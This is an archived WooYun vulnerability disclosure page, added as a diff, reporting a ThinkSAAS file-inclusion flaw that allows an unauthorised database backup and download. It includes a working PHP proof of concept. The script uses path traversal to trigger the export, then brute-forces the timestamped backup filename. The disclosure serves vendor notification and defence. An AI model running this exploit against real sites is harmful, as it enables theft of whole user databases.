@@ -1,0 +1,238 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ThinkSAAS逻辑漏洞可致拖库  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ThinkSAAS逻辑漏洞可致拖库  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/My5t3ry">My5t3ry</a> 
+</li><li>提交时间：		2014-02-22 22:54</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-23：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-26：	细节向第三方安全合作伙伴开放<br/>
+									2014-03-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-15：	细节向普通白帽子公开<br/>
+									2014-04-04：	细节向实习白帽子公开<br/>
+									2014-05-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">ThinkSAAS的一个逻辑漏洞导致可以实时备份网站数据库，同时可以获取备份数据库文件名。<br />
+下载实时备份的数据库实现脱裤。漏洞影响所有版本。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">thinksaas系统使用常量IN_TS来控制页面的访问，然后在每个功能模块用一句代码：<br />
+<br />
+</p><pre><code>defined(&#039;IN_TS&#039;) or die(&#039;Access Denied.&#039;);</code></pre><p class='detail'><br />
+<br />
+来限制访问，这样设计带来的问题是，一个文件包含可以通杀，越权访问执行任意功能模块。<br />
+<br />
+看到/app/user/action/plugin.php代码：<br />
+<br />
+</p><pre><code>&lt;?php<br />
+//插件条件入口<br />
+<br />
+defined(&#039;IN_TS&#039;) or die(&#039;Access Denied.&#039;);<br />
+<br />
+if(is_file(&#039;plugins/&#039;.$app.&#039;/&#039;.$plugin.&#039;/&#039;.$in.&#039;.php&#039;)){<br />
+	require_once(&#039;plugins/&#039;.$app.&#039;/&#039;.$plugin.&#039;/&#039;.$in.&#039;.php&#039;);<br />
+}else{<br />
+	tsNotice(&#039;sorry:no plugin!&#039;);<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+利用上面的代码可以任意包含php文件，接着看到/app/system/action/sql.php代码：<br />
+<br />
+</p><pre><code>&lt;?php <br />
+defined(&#039;IN_TS&#039;) or die(&#039;Access Denied.&#039;);<br />
+switch($ts){<br />
+	case &quot;&quot;:<br />
+		<br />
+		//输出备份文件<br />
+		$arrSqlFile = tsScanDir(&#039;data/baksql&#039;,&#039;file&#039;);<br />
+		<br />
+		include template(&#039;sql&#039;);<br />
+		break;<br />
+		<br />
+	//优化<br />
+	case &quot;optimize&quot;:<br />
+		$arrTables = $db-&gt;fetch_all_assoc(&quot;SHOW TABLES&quot;);<br />
+		foreach($arrTables as $key=&gt;$item){<br />
+			$db-&gt;query(&quot;OPTIMIZE TABLE `&quot;.$item.&quot;` &quot;);<br />
+		}<br />
+		qiMsg(&#039;优化数据库成功！&#039;);<br />
+		break;<br />
+		<br />
+	//备份导出<br />
+	case &quot;export&quot;:<br />
+	<br />
+		require_once &#039;thinksaas/DbManage.php&#039;;<br />
+		$bakdb = new DBManage ( $TS_DB[&#039;host&#039;].&#039;:&#039;.$TS_DB[&#039;port&#039;], $TS_DB[&#039;user&#039;], $TS_DB[&#039;pwd&#039;], $TS_DB[&#039;name&#039;], &#039;utf8&#039; );<br />
+		$bakdb-&gt;backup (&#039;&#039;,&#039;data/baksql/&#039;);<br />
+		<br />
+		qiMsg(&#039;数据库备份完毕！&#039;);<br />
+	<br />
+		break;</code></pre><p class='detail'><br />
+<br />
+利用/app/user/action/plugin.php文件的包含漏洞可以越权执行后台的数据库备份功能，生成数据库备份文件，同时备份的数据库是以date(&#039;YmdHis&#039;)+_all_v1.sql来命名，可以简单预测到备份数据库文件名。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>&lt;?php<br />
+date_default_timezone_set(&#039;Asia/Hong_Kong&#039;);<br />
+$url = &quot;http://192.168.116.129/thinksaas/index.php?app=user&amp;ac=plugin&amp;plugin=face&amp;in=my5t3ry/../../../../app/system/action/sql&amp;ts=export&quot;;<br />
+file_get_contents($url);<br />
+$time = date(&#039;YmdHis&#039;);<br />
+for($i = $time; $i &lt;= $time + 300; $i++){<br />
+	$filename = $i .&quot;_all_v1.sql&quot;;<br />
+	$url = &quot;http://192.168.116.129/thinksaas/data/baksql/&quot;.$filename;<br />
+	if (@file_get_contents($url, null, null, -1, 1)){<br />
+		echo $url;<br />
+	}<br />
+}<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+使用上面的代码可以备份数据库并得到备份数据库文件名，测试如图：<br />
+<br />
+</p><p class="detail"><a href="../images/222224293c94623fbdc6a2150f7d116c2e60529a.jpg" target="_blank"><img src="../images/222224293c94623fbdc6a2150f7d116c2e60529a.jpg" alt="backup.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤&amp;限制 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/My5t3ry" title="My5t3ry">My5t3ry</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-051743" title="ThinkSAAS逻辑漏洞可致拖库">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-02-23 22:39</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已经修复，感谢反馈。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="51743";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
